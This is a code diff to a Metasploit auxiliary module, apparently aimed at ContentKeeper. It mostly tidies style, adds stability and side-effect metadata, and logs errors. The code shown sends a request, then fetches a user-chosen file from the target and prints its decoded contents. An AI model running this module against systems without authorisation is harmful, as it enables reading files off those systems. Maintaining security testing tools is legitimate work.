@@ -20,7 +20,13 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],
       ],
       'Author' => [ 'aushack' ],
-      'License' => MSF_LICENSE)
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
+    )
 
     register_options(
       [
@@ -41,8 +47,7 @@ class MetasploitModule < Msf::Auxiliary
       }, 25
     )
 
-    if (res && (res.code == 500))
-
+    if res && res.code == 500
       print_good("Request appears successful on #{rhost}:#{rport}! Response: #{res.code}")
 
       file = send_request_raw(
@@ -52,15 +57,17 @@ class MetasploitModule < Msf::Auxiliary
         }, 25
       )
 
-      if (file && (file.code == 200))
+      if file && (file.code == 200)
         print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
-      elsif (file && file.code)
+      elsif file && file.code
         print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
       end
-    elsif (res && res.code)
+    elsif res && res.code
       print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
     end
-  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-  rescue ::Timeout::Error, ::Errno::EPIPE
+  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
+    vprint_error(e.message)
+  rescue ::Timeout::Error, ::Errno::EPIPE => e
+    vprint_error(e.message)
   end
 end
